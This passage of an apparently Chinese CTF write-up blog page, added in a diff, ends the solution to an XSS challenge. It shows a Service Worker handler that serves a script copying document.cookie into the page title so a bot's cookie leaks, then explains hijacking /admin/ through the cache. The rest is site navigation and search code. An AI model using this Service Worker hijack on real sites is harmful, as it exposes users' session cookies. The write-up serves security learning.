+        event<span class="token punctuation">.</span><span class="token function">respondWith</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Response</span><span class="token punctuation">(</span><span class="token string">'&lt;script&gt;setInterval(()=&gt;{document.title=document.cookie}, 100)&lt;/script&gt;'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
+            <span class="token literal-property property">headers</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token string-property property">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'text/html'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
+        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<h4 id="2-2-3-获得-flag"><a href="#2-2-3-获得-flag" class="headerlink" title="2.2.3 获得 flag"></a>2.2.3 获得 flag</h4><p>此时如果 xss <span class="hexo-wm">s‌​3ven•﻿𝒔i‌ｔ𝐞‌​</span>bot 访问 <code>/flag2_a/</code><br>就会注册上 <code>/flag2_b/sw.js</code> 的 <code>Service Worker</code><br>/admin/ 就会被劫持到缓存中:<br>即可在 xss bot 处获得 flag 2：<br><img src="image-3.png" alt="image-3.png"></p>
+</body></html>
+        </div>
+        
+          <div class="prev-or-next">
+            <div class="post-foot-next">
+              
+                <a href="../2023-spiritctf-warmup-writeup/" target="_self">
+                  <i class="iconfont icon-chevronleft"></i>
+                  <span>上一页</span>
+                </a>
+              
+            </div>
+            <div class="post-foot-prev">
+              
+                <a href="../2023-actf-writeup/" target="_self">
+                  <span>下一页</span>
+                  <i class="iconfont icon-chevronright"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </div>
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="catalog-zoom">
+      <div class="title">目录</div>
+      <div class="catalog-content">
+        
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Emoji-Wordle"><span class="toc-text">Emoji Wordle</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-1"><span class="toc-text">Level 1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-%E7%88%86%E7%A0%B4%E6%B3%95"><span class="toc-text">1.1 爆破法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-%E9%80%BB%E8%BE%91%E6%B3%95"><span class="toc-text">1.2 逻辑法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-%E6%8F%90%E4%BA%A4-emojis"><span class="toc-text">1.3 提交 emojis</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-2"><span class="toc-text">Level 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-3"><span class="toc-text">Level 3</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%96%B0XSS"><span class="toc-text">第三新XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Flag-1"><span class="toc-text">Flag 1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-iframe-%E8%AF%BB%E5%8F%96%E4%BF%A1%E6%81%AF"><span class="toc-text">1.1 iframe 读取信息</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Flag-2"><span class="toc-text">Flag 2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-Service-Worker-%E5%B7%A5%E4%BD%9C%E8%8C%83%E5%9B%B4%E6%8F%90%E5%8D%87"><span class="toc-text">2.1 Service Worker 工作范围提升</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-%E6%B3%A8%E5%86%8C-Service-Worker-%E7%BC%93%E5%AD%98%E9%A1%B5%E9%9D%A2"><span class="toc-text">2.2 注册 Service Worker 缓存页面</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-1-flag2-a"><span class="toc-text">2.2.1 flag2_a</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-2-flag2-b"><span class="toc-text">2.2.2 flag2_b</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-3-%E8%8E%B7%E5%BE%97-flag"><span class="toc-text">2.2.3 获得 flag</span></a></li></ol></li></ol></li></ol></li></ol>
+        
+      </div>
+    </div>
+  </div>
+
+  
+<script src="../../js/catalog.js"></script>
+
+
+
+
+    
+  </div>
+  <script>
+    (() => {
+      function compensate() {
+        const bodyBox = document.querySelector('.zoom-wrap');
+        if (bodyBox) {
+          const gapY = bodyBox.offsetHeight - bodyBox.getBoundingClientRect().height;
+          bodyBox.style.marginBottom = `-${gapY}px`;
+        }
+
+        const catBox = document.querySelector('.catalog-zoom');
+        if (catBox) {
+          const rect = catBox.getBoundingClientRect();
+          const gapX = catBox.offsetWidth  - rect.width;
+          const gapY = catBox.offsetHeight - rect.height;
+
+          const list = catBox.querySelector('.catalog-content');
+          if (list) {
+            const orig = list.dataset.origHeight
+                      ? parseFloat(list.dataset.origHeight)
+                      : parseFloat(getComputedStyle(list).height);
+            list.dataset.origHeight = orig;
+            list.style.height       = (orig + gapY) + 'px';
+          }
+
+          catBox.style.marginRight  = `-${gapX}px`;
+          catBox.style.marginBottom = `-${gapY}px`;
+        }
+      }
+
+      function hookImages(root = document) {
+        root.querySelectorAll('img').forEach(img => {
+          if (img.dataset._scaledFix) return;
+          img.dataset._scaledFix = 1;
+          img.addEventListener('load', compensate, {once: true});
+        });
+      }
+
+      addEventListener('DOMContentLoaded', () => {
+        compensate();
+        hookImages();
+      });
+
+      addEventListener('resize', compensate);
+
+      const observer = new MutationObserver(muts => {
+        muts.forEach(m => {
+          m.addedNodes.forEach(n => {
+            if (n.nodeType !== 1) return;
+            if (n.tagName === 'IMG') hookImages(n.parentNode);
+            else hookImages(n);
+          });
+        });
+      });
+
+      const wrap = document.querySelector('.zoom-wrap');
+      if (wrap) observer.observe(wrap, {childList: true, subtree: true});
+    })();
+  </script>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" href="https://github.com/security-s3ven">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a href="https://github.com/security-s3ven">Copyright © 2023-2026 s3ven</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="../../js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="../../js/colorscheme.js"></script>
+
+
+
+
+
+        
+
+      </div>
+    </div>
+  </body>
+</html>
